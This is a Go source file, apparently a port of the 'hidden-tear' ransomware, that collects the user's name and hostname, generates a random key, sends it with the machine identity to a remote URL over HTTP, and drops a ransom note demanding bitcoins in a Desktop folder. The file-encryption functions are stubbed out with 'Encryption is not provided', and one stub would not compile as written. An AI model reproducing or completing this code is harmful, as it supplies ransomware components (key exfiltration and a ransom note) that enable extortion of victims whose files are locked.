package main

import (
	"os"
	"time"
	"strings"
	"os/user"
	"net/http"
	"math/rand"
)

var TargetURL = "https://example.com/hidden-tear/write.php?info="
var UserName string
var ComputerName string
var UserDir = "C:\\Users\\"

func init() {
	usr, err := user.Current()
	if err != nil {
		os.Exit(0)
	} else {
		UserName = usr.Username
		if strings.Contains(UserName, "\\") {
			parts := strings.SplitN(UserName, "\\", 2)
			UserName = parts[1]
		}
	}

	hostname, err := os.Hostname()
	if err != nil {
		os.Exit(0)
	} else {
		ComputerName = hostname
	}
}

/* Encryption is not provided */
func AES_Encrypt(bytesToBeEncrypted []byte, passwordBytes []byte) []byte { return }

func CreatePassword(length int) string {
	valid := []byte("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/")
	var builder strings.Builder
	rand.Seed(time.Now().UnixNano())
	for 0 < length {
		builder.WriteString(string(valid[rand.Intn(len(valid))]))
		length = length-1
	}
	res := builder.String()
	return res
}

func SendPassword(password string) {
	var info string = ComputerName + "-" + UserName + " " + password
	var fullUrl = TargetURL + info
	resp, err := http.Get(fullUrl)
	if err != nil {
		return
	}
	defer resp.Body.Close()
}

/* Encryption is not provided */
func EncryptFile(file string, password string) { return }

/* Encryption is not provided */
func EncryptDirectory(location string , password string) { return }

func main() {
	var password string = CreatePassword(15)
	var path string = "\\Desktop\\test"
	var startPath string = UserDir + UserName + path
	EncryptDirectory(startPath, password)
	SendPassword(password)
	MessageCreator()
	password = ""
	os.Exit(0)
}

func MessageCreator() {
	var path string = "\\Desktop\\test\\READ_IT.txt"
	var fullPath string = UserDir + UserName + path
	lines := []string{ "Files has been encrypted with hidden tear", "Send me some bitcoins or kebab", "And I also hate night clubs, desserts, being drunk." }
	file, err := os.Create(fullPath)
	print(fullPath)
	if err != nil {
		return
	}
	defer file.Close()

	for _, line := range lines {
		_, err := file.WriteString(line + "\n")
		if err != nil {
			return
		}
	}
}
